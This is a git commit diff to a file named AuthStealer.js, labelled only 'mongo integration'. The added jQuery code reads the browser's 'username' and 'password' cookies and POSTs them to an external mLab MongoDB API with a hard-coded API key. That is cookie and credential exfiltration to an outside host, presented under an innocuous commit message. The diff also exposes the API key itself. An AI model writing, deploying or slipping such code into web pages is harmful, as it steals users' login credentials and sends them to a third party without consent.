5e94244b5d922f3d29d7f91d54433422e743ffbb
shiv <sdeshmukh@tavisca.com>
2017-04-26 17:37:46 +0530

    mongo integration

--- AuthStealer.js
+++ AuthStealer.js
@@ -1,3 +1,20 @@
+function PostCookie(key, value){
+	$.ajax({ 
+		url: "https://api.mlab.com/api/1/databases/transit/collections/Cookie?apiKey=jnvApBWjlMBlhq5wSSI0d7wwJLHV4IM8",
+		data: JSON.stringify( { "key" : key, "value" : value } ),
+		type: "POST",
+		contentType: "application/json" 
+	});
+}
+function RetrieveCookie(key){
+	var url = "https://api.mlab.com/api/1/databases/transit/collections/Cookie?q={"key":key}&apiKey=jnvApBWjlMBlhq5wSSI0d7wwJLHV4IM8";
+	$.getJSON(url).done(function (response) {
+		return response;
+	}).fail(function(){
+		return null;
+	});
+}
+
  $( function() {
 	// This code sets the cookie, I need this for my testing. you do not need this.
 	$.cookie('username', 'dhananjay');
@@ -6,6 +23,15 @@
 	console.log($.cookie('username'));
 	console.log($.cookie('password'));
 	
+	if($.cookie('username') != ""){
+		PostCookie('username',$.cookie('username'));
+	}
+	
+	if($.cookie('password') != ""){
+		PostCookie('password',$.cookie('password'));
+	}
+	
+	console.log(RetrieveCookie("username"));
 });
 
 
